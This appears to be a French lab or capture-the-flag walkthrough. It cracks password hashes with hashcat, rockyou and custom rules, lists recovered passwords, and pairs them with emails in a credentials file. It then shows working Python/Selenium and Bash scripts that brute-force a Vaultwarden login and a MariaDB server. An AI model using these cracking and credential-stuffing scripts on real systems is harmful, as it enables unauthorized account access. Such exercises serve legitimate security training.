On va maintenant essayer de trouver avec quel algorithme les mots de passe ont été hachés.  
Pour ce faire, on va utiliser **hashcat**.

![[Pasted image 20250131131751.png]]

Hashcat nous retourne plusieurs méthodes de hachage possibles.  
On peut désormais essayer chaque méthode de hachage avec une liste de mots de passe courants, ici **rockyou**.

Avec cette commande :

"hashcat -m 17600 -a 0 "Desktop/hashs" Desktop/rockyou.txt -O"

on obtient **4 mots de passe** :

- **theused13**
- **hockey43**
- **12373**
- **3976553**

On peut voir des similitudes entre ces mots de passe. La plus flagrante est le **3** qui est rajouté à la fin de chaque mot de passe.  
On va tester notre théorie en ajoutant une règle à **hashcat**, lui indiquant d'ajouter "3" à la fin de chaque mot de passe dans la liste **rockyou**.

Pour ce faire, on crée un fichier texte et on écrit dedans : **"$3"**, indiquant à hashcat d’ajouter **3** à la fin.

Puis on exécute :

"hashcat -m 17600 -a 0 "Desktop/coco.txt" Desktop/hashs.txt -O -r the.rule"

Avec le flag **-r**, on peut dire à hashcat d’utiliser notre règle précédemment créée.

Cette fois, on obtient **200 nouveaux mots de passe**.

Avec un plus grand échantillon, on peut en déduire de **nouvelles règles** :

- **Tous les mots de passe sont en minuscules.**
- **Toutes les lettres "a" sont remplacées par "@".**

On modifie maintenant la règle précédemment créée :

- **"sa@"** indique que toutes les instances de "a" doivent être remplacées par "@".
- **"l"** indique que tout doit être en minuscules.

On vérifie si notre raisonnement est correct avec :

"hashcat -m 17600 -a 0 "Desktop/hashs" Desktop/rockyou.txt -O -r the.rule"

![[Pasted image 20250131133431.png]]

**Bim !** **470 hashes uniques trouvés !**

---

Maintenant qu'on a les mots de passe, on va créer un fichier à l'aide d'un script **Python** qui va associer chaque mot de passe à l’adresse e-mail correspondante.

### Script Python :

import pandas as pd

# Chemins des fichiers
passwords_file = "hash.txt"
emails_file = "dbo.authentication.csv"
output_file = "credentials.txt"

# Lire le fichier des mots de passe et stocker les hashes associés aux mots de passe
passwords = {}

with open(passwords_file, "r") as file:
    for line in file:
        parts = line.strip().split(":")
        if len(parts) == 2:
            hash_value, password = parts
            passwords[hash_value] = password

# Lire le fichier CSV contenant les adresses e-mail et les hashes des mots de passe
emails_df = pd.read_csv(emails_file)

# Associer les hashes aux emails
matched_credentials = []
for index, row in emails_df.iterrows():
    email = row["username"]
    hash_value = row["password"]
    if hash_value in passwords:
        matched_credentials.append((email, passwords[hash_value]))

# Écrire les correspondances dans un fichier texte
with open(output_file, "w") as file:
    for email, password in matched_credentials:
        file.write(f"{email}:{password}\n")

print(f"Fichier généré : {output_file}")

On a maintenant un fichier qu'on peut **facilement utiliser** pour brute-force un service.

---

On a désormais **trois chemins possibles** avec cette méthode :

- Un **service SSH** (**peu probable**).
- Une **page web Vaultwarden** (**possible**).
- Un **service MariaDB** (**fortement probable**).

---

On a commencé par essayer de brute-force **Vaultwarden** à l'aide de ce script **Python** :

from selenium import webdriver
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.common.by import By
import time

driver = webdriver.Firefox()
driver.get("https://172.16.10.42/#/login")
time.sleep(2)

with open("matched_credentials.txt") as file_in:
    for line in file_in:
        creds = line.strip().split(':')
        mail_input = driver.find_element(By.ID, "bit-input-1")
        mail_input.clear()
        mail_input.send_keys(creds[0])
        mail_input.send_keys(Keys.RETURN)

        passwd_input = driver.find_element(By.ID, "bit-input-0")
        passwd_input.send_keys(creds[1])
        passwd_input.send_keys(Keys.RETURN)

        if "Get master password hint" in driver.page_source:
            driver.find_element(By.LINK_TEXT, "Not you?").click()
            time.sleep(1)
        else: 
            print(mail_input)
            print(passwd_input)

driver.close()

**Sans succès.**

---

On va maintenant essayer d'attaquer **MariaDB** avec ce script **Bash** :

#!/bin/bash

IFS=''
while read line; do
    user=$(echo $line | cut -d ':' -f 1)
    pass=$(echo $line | cut -d ':' -f 2)
    echo "Tentative de connexion avec ${user}:${pass}"
    mysql --ssl-verify-server-cert=FALSE --host=172.16.10.43 -u "${user}" -p"${pass}"
done < credentials.txt

